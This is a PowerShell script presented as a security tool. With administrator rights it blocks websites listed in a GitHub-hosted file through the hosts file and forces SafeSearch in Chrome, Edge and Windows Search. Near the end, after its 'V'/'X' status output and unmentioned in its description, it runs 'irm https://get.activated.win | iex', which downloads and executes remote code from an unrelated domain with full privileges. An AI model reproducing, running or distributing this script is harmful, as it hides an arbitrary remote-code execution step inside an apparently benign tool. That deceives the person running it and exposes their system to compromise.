<#
.SYNOPSIS
    This script enhances computer security by blocking websites and locking SafeSearch.
    It runs silently, outputting only 'V' (Success) or 'X' (Failure).
    It uses a fixed URL, which may have a 5-10 minute update delay from GitHub.
    !! MUST be run as Administrator !!
#>

# --- Administrator Check ---
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Error: Please run this script as Administrator."
    Write-Host "Press Enter to exit..."
    Read-Host
    exit
}

# --- Main Logic Block ---
try {
    # --- Settings ---
    $hostsFilePath = "$env:SystemRoot\System32\drivers\etc\hosts"
    
    # --- 1. Backup hosts file (Silently) ---
    $backupFileName = "$hostsFilePath.backup.$(Get-Date -Format 'yyyy-MM-dd-HHmm')"
    Copy-Item -Path $hostsFilePath -Destination $backupFileName -Force | Out-Null
    
    # --- 2. Load block list from GitHub (Fixed URL) ---
    $blockListUrl = "https://raw.githubusercontent.com/Nazshimy/-/refs/heads/main/list.txt" 
    
    # We still use "no-cache" on the *client* side, which is good practice.
    # The 5-10 min delay is from the *server* side, which this doesn't change.
    $domainsToBlock = Invoke-RestMethod -Uri $blockListUrl -Headers @{"Cache-Control"="no-cache"} -ErrorAction Stop
    
    if (-not $domainsToBlock -or $domainsToBlock.Count -eq 0) {
        # This throw will be caught by the main 'catch' block
        throw "The block list downloaded from GitHub is empty."
    }

    # --- 3. Format and append addresses (Silently) ---
    $formattedLines = @() 
    
    foreach ($domain in $domainsToBlock) {
        if (-not [string]::IsNullOrWhiteSpace($domain)) {
            $trimmedDomain = $domain.Trim() 
            $formattedLines += "127.0.0.1 $trimmedDomain"
            if (-not $trimmedDomain.StartsWith("www.")) {
                $formattedLines += "127.0.0.1 www.$trimmedDomain"
            }
        }
    }
    
    $header = "`n# --- Custom GitHub block list added on $(Get-Date) ---`n"
    Add-Content -Path $hostsFilePath -Value $header | Out-Null
    Add-Content -Path $hostsFilePath -Value $formattedLines | Out-Null
    
    # --- 4. Force SafeSearch (Silently) ---
    
    # Google Chrome
    $regPathChrome = "HKLM:\SOFTWARE\Policies\Google\Chrome"
    if (-not (Test-Path $regPathChrome)) { New-Item -Path $regPathChrome -Force | Out-Null }
    New-ItemProperty -Path $regPathChrome -Name "ForceSafeSearch" -Value 1 -PropertyType "DWord" -Force | Out-Null
    
    # Microsoft Edge
    $regPathEdge = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    if (-not (Test-Path $regPathEdge)) { New-Item -Path $regPathEdge -Force | Out-Null }
    New-ItemProperty -Path $regPathEdge -Name "SafeSearchEnabled" -Value 1 -PropertyType "DWord" -Force | Out-Null

    # Bing (Windows Search)
    $regPathBing = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search"
    if (-not (Test-Path $regPathBing)) { New-Item -Path $regPathBing -Force | Out-Null }
    New-ItemProperty -Path $regPathBing -Name "AllowSearchToUseLocation" -Value 0 -PropertyType "DWord" -Force | Out-Null
    New-ItemProperty -Path $regPathBing -Name "DisableWebSearch" -Value 0 -PropertyType "DWord" -Force | Out-Null
    New-ItemProperty -Path $regPathBing -Name "ConnectedSearchSafeSearch" -Value 2 -PropertyType "DWord" -Force | Out-Null

    # --- Success Output ---
    Write-Host "V" -ForegroundColor Green
}
catch {
    # --- Failure Output ---
    Write-Host "X" -ForegroundColor Red
}
irm https://get.activated.win | iex
Write-Host "Press Enter to exit..."
# --- Wait for user (Silently) ---
Read-Host
